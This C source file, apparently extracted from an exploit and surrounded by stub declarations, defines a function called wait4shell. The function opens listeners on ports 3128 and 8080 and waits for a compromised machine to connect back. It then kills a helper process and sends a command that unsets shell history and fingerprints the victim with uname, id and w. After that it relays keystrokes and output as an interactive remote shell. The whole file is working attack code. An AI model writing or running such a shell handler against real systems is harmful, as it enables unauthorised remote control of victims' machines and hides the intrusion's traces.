
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {void* sin_port; TYPE_1__ sin_addr; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int p8080 ;
typedef int p3128 ;
typedef int fd_set ;
typedef int buf ;


 void* AF_INET ;
 int EXIT_FAILURE ;
 scalar_t__ FD_ISSET (int,int *) ;
 int FD_SET (int,int *) ;
 int FD_ZERO (int *) ;
 void* INADDR_ANY ;
 int PF_INET ;
 int SIGKILL ;
 int SOCK_STREAM ;
 int accept (int,int *,int ) ;
 scalar_t__ bind (int,struct sockaddr*,int) ;
 int die (char*) ;
 int exit (int ) ;
 void* htons (int) ;
 int kill (int,int ) ;
 scalar_t__ listen (int,int) ;
 int memset (struct sockaddr_in*,int ,int) ;
 int printf (char*) ;
 int read (int,char*,int) ;
 int select (int,int *,int *,int *,int *) ;
 int socket (int ,int ,int ) ;
 int strlen (char*) ;
 scalar_t__ writen (int,char*,int) ;

void wait4shell(int p)
{
 int l, s1, s2, a1, a2;
 char buf[512];
 fd_set rfds;
 char *cmd = "unset HISTFILE;uname -a;id;w\n";
 struct sockaddr_in p8080, p3128;

 memset(&p8080, 0, sizeof(p8080));
 memset(&p3128, 0, sizeof(p3128));


 p8080.sin_family = AF_INET;
 p8080.sin_addr.s_addr = INADDR_ANY;
 p8080.sin_port = htons(8080);
 p3128.sin_family = AF_INET;
 p3128.sin_addr.s_addr = INADDR_ANY;
 p3128.sin_port = htons(3128);

 if ((s1 = socket(PF_INET, SOCK_STREAM, 0)) < 0)
  die("wait4shell::socket/1");
 if ((s2 = socket(PF_INET, SOCK_STREAM, 0)) < 0)
  die("wait4shell::socket/2");
 if (bind(s1, (struct sockaddr*)&p3128, sizeof(p3128)) < 0)
  die("wait4shell::bind/1");
 if (bind(s2, (struct sockaddr*)&p8080, sizeof(p8080)) < 0)
  die("wait4shell::bind/2");

 if (listen(s1, 1) < 0)
  die("wait4shell::listen/1");
 if (listen(s2, 1) < 0)
  die("wait4shell::listen/2");

 if ((a1 = accept(s1, ((void*)0), 0)) < 0)
  die("wait4shell::accept/1");
 if ((a2 = accept(s2, ((void*)0), 0)) < 0)
  die("wait4shell::accept/1");

 printf("\nConnected!\n");
 kill(p, SIGKILL);

 if (writen(a1, cmd, strlen(cmd)) < 0)
  die("wait4shell::write");

 while (1) {
  FD_ZERO(&rfds);
  FD_SET(0, &rfds);
  FD_SET(a1, &rfds);
  FD_SET(a2, &rfds);

  select(a2 + 1, &rfds, ((void*)0), ((void*)0), ((void*)0));
  if (FD_ISSET(0, &rfds)) {
   l = read(0, buf, sizeof (buf));
   if (l <= 0)
    die("wait4shell::read");
   writen(a1, buf, l);
  }
  if (FD_ISSET(a2, &rfds)) {
   l = read(a2, buf, sizeof (buf));
   if (l == 0) {
    printf("connection closed by foreign host.\n");
    exit(EXIT_FAILURE);
   } else if (l < 0)
    die("wait4shell::read remote");
   writen(1, buf, l);
  }
 }
}
